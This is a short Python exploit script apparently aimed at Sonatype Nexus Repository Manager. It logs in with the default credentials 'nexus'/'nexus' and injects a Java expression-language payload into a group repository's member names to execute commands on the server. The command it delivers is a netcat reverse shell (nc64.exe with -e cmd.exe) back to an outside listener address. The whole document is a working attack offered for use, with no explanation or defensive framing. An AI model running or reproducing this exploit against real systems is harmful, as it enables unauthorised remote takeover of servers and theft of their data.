#!/usr/bin/python3

import sys
import base64
import requests

URL = 'http://192.168.236.61:8081' 
CMD = 'nc64.exe 192.168.45.196 9001 -e cmd.exe'
USERNAME = 'nexus'
PASSWORD = 'nexus'

def log(message):
    print(f'[INFO] {message}')

def error(message):
    print(f'[ERROR] {message}', file=sys.stderr)

def login(session, url, username, password):
    log('Logging in')
    body = {
        'username': base64.b64encode(username.encode('utf-8')).decode('utf-8'),
        'password': base64.b64encode(password.encode('utf-8')).decode('utf-8')
    }
    response = session.post(url + '/service/rapture/session', data=body)
    if response.status_code != 204:
        error(f'Login unsuccessful: {response.status_code}')
        sys.exit(1)
    log('Logged in successfully')

def execute_command(session, url, cmd):
    body = {
        'name': 'internal',
        'online': True,
        'storage': {
            'blobStoreName': 'default',
            'strictContentTypeValidation': True
        },
        'group': {
            'memberNames': [
                f'$\\A{{\'\'.getClass().forName(\'java.lang.Runtime\').getMethods()[6].invoke(null).exec(\'{cmd}\')}}'
            ]
        },
    }
    response = session.post(url + '/service/rest/beta/repositories/go/group', json=body)
    if 'java.lang.ProcessImpl' in response.text:
        log('Command executed')
        sys.exit(0)
    else:
        error('Error executing command, the following was returned by Nexus')
        error(response.text)

def main():
    session = requests.Session()
    login(session, URL, USERNAME, PASSWORD)
    execute_command(session, URL, CMD)

if __name__ == '__main__':
    main()
